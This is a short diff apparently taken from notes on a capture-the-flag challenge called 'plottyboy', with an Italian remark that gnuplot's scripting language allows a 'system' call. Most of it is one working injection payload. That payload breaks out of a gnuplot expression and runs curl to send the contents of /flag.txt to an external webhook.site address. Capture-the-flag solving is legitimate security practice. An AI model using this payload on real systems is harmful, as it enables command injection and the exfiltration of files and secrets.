@@ -1,1 +1,4 @@
 x; system('curl --data "$(cat /flag.txt)" https://webhook.site/<unique-id>')
+
+
+plottyboy, si sfrutta la sintassi di gnuplot, che ha un linguaggio a se, che ti permette di scrivere "system"
